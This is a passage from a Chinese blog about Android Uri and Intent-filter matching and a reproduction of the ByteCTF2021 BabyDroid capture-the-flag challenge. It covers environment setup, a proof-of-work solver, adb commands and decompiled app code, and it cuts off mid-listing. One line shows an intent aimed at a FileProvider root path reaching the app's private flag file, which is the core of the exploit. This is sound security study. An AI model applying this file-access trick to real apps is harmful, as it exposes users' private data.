title="URI补充"></a>URI补充</h3><p>之前文章介绍过还是有遗漏的知识,之前主要是操控file</p><p>Uri代表要操作的数据，Android上可用的每种资源 (图像、视频片段、网页等) 都可以用Uri来表示。从概念上来讲，UrI包括URL。</p><p>Uri的基本结构是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">大致为[scheme:]scheme-specific-part[#fragment]</span><br><span class="line">细分为[scheme:][//authority][path][?query][#fragment]</span><br></pre></td></tr></table></figure><p>path可以存在多个，以”&#x2F;“连接 scheme:&#x2F;&#x2F;authority&#x2F;path1&#x2F;path2&#x2F;path3?query#fragment</p><p>query可以带参数的返回值也可不带 scheme:&#x2F;&#x2F;authority&#x2F;path1&#x2F;path2&#x2F;path3?id &#x3D; 1#fragment</p><p>举例如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://http://www.eeeeeeeeeeeeeeeea.cn/about?id=1</span><br></pre></td></tr></table></figure><p>scheme是在”:”之前，所以他匹配的是http</p><p>authority是在”&#x2F;&#x2F;“之后，所以<a href="http://www.eeeeeeeeeeeeeeeea.cn与其对应/">http://www.eeeeeeeeeeeeeeeea.cn与其对应</a></p><p>path自然对应的就是about这个页面,query对应的是id&#x3D;1</p><p>在安卓内，除了authority和scheme必须存在，其他的可以选择性的要或者不要</p><p>将一个url解析成uri对象的操作是Uri.parse(“<a href="http://www.baidu.com”),就是将百度网址解析成一个uri对象,可以对其进行其他的各种操作了/">http://www.baidu.com”)，就是将百度网址解析成一个uri对象，可以对其进行其他的各种操作了</a></p><table><thead><tr><th>部分</th><th>值</th></tr></thead><tbody><tr><td>scheme</td><td>http</td></tr><tr><td>host &#x2F; authority</td><td><a href="http://www.baidu.com/">www.baidu.com</a></td></tr><tr><td>path</td><td>&#x2F;</td></tr></tbody></table><p>上篇文章中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent_back.setData(Uri.parse(&quot;content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag&quot;));</span><br></pre></td></tr></table></figure><p>其实也是一个道理</p><h3 id="Intent补充"><a href="#Intent补充" class="headerlink" title="Intent补充"></a>Intent补充</h3><p>显式intent和隐式intent</p><p>intent包括两种，一是显式另一个是隐式。显式intent通常是已经知道要启动Activity的包名，多发于同一个app内；隐式intent只知道要执行的动作是什么，比如拍照，录像，打开一个网站。</p><p>那么隐式的intent如何启动一个组件呢呢？如果没有约束的话可能会造成一些后果，所以在Manifest文件内定义了intent-filter标签，如果组件中的intentfilter和intent中的intentfilter匹配，系统就会启动该组件，并把intent传给它；若有多个组件都符合，系统变会弹出一个窗口，任我们选择启动该intent的应用(app)。</p><p>在intent-filter标签中，我们可以选择三个intent的属性进行设置，包括action，category，data</p><p>怎么匹配?</p><p>系统主要从三方面**做匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Action  +  Data  +  Category</span><br></pre></td></tr></table></figure><p><strong>三者同时满足，才算匹配</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><p>规则：</p><p>Intent 只能有一个 action，intent-filter 可以声明多个 action</p><p>只要 Intent 的 action &#x3D;&#x3D; intent-filter 中的任意一个 action，即匹配</p><p>Intent 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br></pre></td></tr></table></figure><p>Manifest 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><p>规则：</p><blockquote><p><strong>Intent 中的所有 category，必须都在 intent-filter 中出现</strong></p></blockquote><ul><li><p>Intent 可以有多个 category</p></li><li><p>intent-filter 也可以有多个</p></li><li><p><strong>intent-filter 多出来的 category 不影响</strong></p></li><li><p>Intent 多出来的 category → 不匹配</p></li><li><p><strong>隐式 Intent 默认会自动加上 <code>CATEGORY_DEFAULT</code></strong></p></li><li><p>所以：intent-filter <strong>几乎必须声明 DEFAULT</strong>否则 <code>startActivity(intent)</code> 会直接失败</p></li></ul><p>Intent 中的 Data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setData(Uri.parse(&quot;http://www.baidu.com&quot;));</span><br></pre></td></tr></table></figure><p>intent-filter 中的 Data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;data</span><br><span class="line">    android:scheme=&quot;http&quot;</span><br><span class="line">    android:host=&quot;www.baidu.com&quot;</span><br><span class="line">    android:path=&quot;/&quot; /&gt;</span><br></pre></td></tr></table></figure><p>匹配规则：</p><p>① scheme 必须匹配</p><ul><li>Intent 有 scheme → filter 必须有相同 scheme</li><li>常见：<ul><li>http</li><li>https</li><li>content</li><li>file</li><li>intent</li></ul></li></ul><p>② host &#x2F; port &#x2F; path</p><ul><li>filter 中声明了 → 必须匹配</li><li>filter 没声明 → 不限制</li></ul><hr><p>③ MIME 类型（如果有）</p><ul><li><code>intent.setType(&quot;image/png&quot;)</code></li><li>filter 里也要能接住</li></ul><p>例子</p><p>Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent(Intent.ACTION_VIEW);</span><br><span class="line">intent.setData(Uri.parse(&quot;http://www.baidu.com&quot;));</span><br></pre></td></tr></table></figure><p>Manifest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;</span><br><span class="line">    &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">    &lt;data android:scheme=&quot;http&quot; /&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>在 Android 12（API 31）之前：</strong></p><ul><li><strong>有 <code>intent-filter</code> → <code>exported</code> 默认为 <code>true</code></strong></li><li><strong>没有 <code>intent-filter</code> → <code>exported</code> 默认为 <code>false</code></strong></li></ul></blockquote><blockquote><p><strong>在 Android 12 及之后：</strong></p><ul><li><strong>只要组件声明了 <code>intent-filter</code>，就必须显式写 <code>android:exported=&quot;true|false&quot;</code></strong></li><li>否则 <strong>直接安装失败</strong></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-EasyDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-EasyDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 EasyDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021 EasyD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 BabyDroid复现</title>
    <link href="http://matriy330.github.io/27338605/"/>
    <id>http://matriy330.github.io/27338605/</id>
    <published>2026-01-17T05:38:37.000Z</published>
    <updated>2026-01-20T11:54:08.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-BabyDroid复现"><a href="#ByteCTF2021-BabyDroid复现" class="headerlink" title="ByteCTF2021 BabyDroid复现"></a>ByteCTF2021 BabyDroid复现</h1><p>直接参考<a href="https://blog.lleavesg.top/article/ByteCTF-2021-BabyDroid#f13f4051d167405c98dd996efc97e377">ByteCTF2021 BabyDroid复现 | LLeaves Blog</a></p><p>还真没做过这样的题，首先环境就搞了半天</p><h2 id="Docker环境配置-失败"><a href="#Docker环境配置-失败" class="headerlink" title="Docker环境配置(失败)"></a>Docker环境配置(失败)</h2><blockquote><p>PS：最后还是没跑起来</p></blockquote><p>附件地址：<a href="https://ctf.lanzoui.com/b02cjfxtg">ByteCTF</a></p><p>复现环境说明：<a href="https://my.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">ByteCTF2021 writeup for Android challenges - 飞书云文档</a></p><p>下载下来后可以看到Dockerfile等文件</p><p>你需要一台云服务器(因为在部署时，需要&#x2F;dev&#x2F;kvm)</p><blockquote><p><strong>容器里要跑 Android emulator，需要宿主机提供 KVM</strong>。<strong>虚拟机里还不能再开 KVM（嵌套虚拟化）</strong></p></blockquote><p>一般物理机比较稳</p><p>将内容传至服务器后，给run.sh权限</p><p>然后修改Dockerfile需要修改几个地方</p><p>①</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RUN set -e -x; \</span><br><span class="line">        yes | sdkmanager --install \</span><br><span class="line">                &quot;cmdline-tools;latest&quot; \</span><br><span class="line">                &quot;platform-tools&quot; \</span><br><span class="line">                &quot;build-tools;30.0.0&quot; \</span><br><span class="line">                &quot;platforms;android-30&quot; \</span><br><span class="line">                &quot;system-images;android-30;google_apis;x86_64&quot; \</span><br><span class="line">                &quot;emulator&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RUN set -e -x; \</span><br><span class="line">        yes | SKIP_JDK_VERSION_CHECK=1 sdkmanager --install \</span><br><span class="line">                &quot;cmdline-tools;latest&quot; \</span><br><span class="line">                &quot;platform-tools&quot; \</span><br><span class="line">                &quot;build-tools;30.0.0&quot; \</span><br><span class="line">                &quot;platforms;android-30&quot; \</span><br><span class="line">                &quot;system-images;android-30;google_apis;x86_64&quot; \</span><br><span class="line">                &quot;emulator&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>②</p><p>去掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN sdkmanager --update;</span><br></pre></td></tr></table></figure><blockquote><p><strong>老题目 + 新 SDK + 新 Docker &#x3D; 必须做一次兼容修补</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115213729715.png" alt="image-20260115213729715"></p><p>这里还有个提交的输入简单写个脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;c7b1dd&quot;</span></span><br><span class="line">target = <span class="string">&quot;000000&quot;</span></span><br><span class="line">chars = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(p)</span><br><span class="line">        h = hashlib.sha256((prefix + s).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> h.startswith(target):</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            <span class="keyword">raise</span> SystemExit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115214100069.png" alt="image-20260115214100069"></p><p>正确即可输入apk，URL</p><p>这个题目的逻辑不是传统意义的CTF解题</p><p>比赛方提供环境，环境内运行APK，我们需要用APK研究漏洞，编写出自己的APK去攻击利用，得到flag，因此复现时部署环境需要用kvm</p><p>坑点，里面还有端口的问题，也就是说即使你能跑起来这个docker也会遇上端口不对齐的问题，就算对齐了，也跑不起来</p><p>还要修复jdk版本不对，文件里的是jdk11，现在需要使用jdk17了，修复后仍然跑不起来力竭了</p><p>可以看看<a href="https://xz.aliyun.com/news/16393">Android Security学习之ByteCTF2021_mobile 环境搭建+前两道题Writeup-先知社区</a></p><p>但是多半也是跑不起来的</p><h2 id="模拟器环境搭建"><a href="#模拟器环境搭建" class="headerlink" title="模拟器环境搭建"></a>模拟器环境搭建</h2><p>可以先看后面的分析再来搭环境</p><p>manifest文件将Flagreceiver设置为exported为false和设置了intent-filter，防止外界app进行干扰</p><p>如何将flag传递给FlagReceiver？</p><p>有root就行</p><p>参考博客：[<a href="https://bbs.kanxue.com/thread-275379-1.htm#msg_header_h1_2">原创]ByteCTF2022 mobile系列-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am broadcast -W -a &quot;com.wuhengctf.SET_FLAG&quot; -n &quot;com.bytectf.babydroid/.FlagReceiver&quot; -e &#x27;flag&#x27; &#x27;flag&#123;eeeeeeee&#125;&#x27;</span><br></pre></td></tr></table></figure><p>我们可以用Android Studio的模拟器，选择Android 11</p><table><thead><tr><th>Android 版本</th><th>API</th><th>代号</th></tr></thead><tbody><tr><td>Android 15&#x2F;16 (Preview)</td><td>36</td><td>（内部名）</td></tr><tr><td>Android 14</td><td>34 &#x2F; 35</td><td><strong>UpsideDownCake</strong></td></tr><tr><td>Android 13</td><td>33</td><td><strong>Tiramisu</strong></td></tr><tr><td>Android 12L</td><td>32</td><td>Snow Cone v2</td></tr><tr><td>Android 12</td><td>31</td><td>Snow Cone</td></tr><tr><td>Android 11</td><td>30</td><td>Red Velvet Cake</td></tr><tr><td>Android 10</td><td>29</td><td>Q</td></tr><tr><td>Android 9</td><td>28</td><td>Pie</td></tr><tr><td><strong>Android 8.1</strong></td><td><strong>27</strong></td><td><strong>Oreo</strong></td></tr><tr><td>Android 8.0</td><td>26</td><td>Oreo</td></tr><tr><td>Android 7.x</td><td>24–25</td><td>Nougat</td></tr><tr><td>Android 6.0</td><td>23</td><td>Marshmallow</td></tr><tr><td>Android 5.x</td><td>21–22</td><td>Lollipop</td></tr><tr><td>Android 4.4</td><td>19</td><td>KitKat</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.bytectf.babydroid/.MainActivity</span><br></pre></td></tr></table></figure><p>启动安装的app</p><img src="C:\Users\Matriy\AppData\Roaming\Typora\typora-user-images\image-20260120171509288.png" alt="image-20260120171509288" style="zoom:50%;" /><p>广播完可以看到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120191621596.png" alt="image-20260120191621596"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120193527555.png" alt="image-20260120193527555"></p><h2 id="APP分析"><a href="#APP分析" class="headerlink" title="APP分析"></a>APP分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.babydroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Babydroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.TEST&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;action android:name=&quot;com.bytectf.TEST&quot;/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>任何 App 都可以用 action <code>com.bytectf.TEST</code> 启动 Vulnerable</p></blockquote><p><code>receiver</code> 对应的是 Android 的 <strong>BroadcastReceiver 组件</strong>。</p><p>在系统层面：</p><blockquote><p><strong>BroadcastReceiver 是一种“被动组件”</strong></p><p>它不会自己运行，只会在<strong>收到匹配的广播 Intent 时被唤醒</strong></p></blockquote><p><code>intent-filter</code> 是一个 <strong>匹配规则</strong>，告诉 Android哪些 Intent 能匹配到我这个组件</p><blockquote><p><strong>Intent 是 Android 里请求做一件事的消息对象。</strong>一个我想干什么的声明，由系统帮你找谁来干</p></blockquote><p>Android 为什么需要 Intent？因为 Android 有一个<strong>根本设计目标</strong>：</p><blockquote><p><strong>App 之间不能直接互相调用代码（沙箱隔离）。</strong></p></blockquote><p>当一个 Intent 被发出时，系统会做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for 每一个已注册组件:</span><br><span class="line">    if intent-filter 能匹配 Intent:</span><br><span class="line">        加入候选列表</span><br></pre></td></tr></table></figure><table><thead><tr><th>Intent 字段</th><th>intent-filter 中是否声明</th><th>是否必须</th></tr></thead><tbody><tr><td>action</td><td>必须匹配</td><td>必须</td></tr><tr><td>category</td><td>Intent 里的每个都要被 filter 包含</td><td>有则必须</td></tr><tr><td>data</td><td>scheme&#x2F;host&#x2F;path 匹配</td><td>有则必须</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:exported=&quot;false&quot;</span><br></pre></td></tr></table></figure><p>这告诉系统：只有同一个 App 或系统进程，才能用这个 Intent 命中</p><p>这里可能有点懵，先看后面</p><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥</p><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>这段代码 <strong>不会自己运行</strong>，只会在 <strong>Android 系统调用它时</strong>运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有人 sendBroadcast(Intent)</span><br><span class="line">↓</span><br><span class="line">Intent 的 action 命中 FlagReceiver 的 intent-filter</span><br><span class="line">↓</span><br><span class="line">系统调用 onReceive()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> 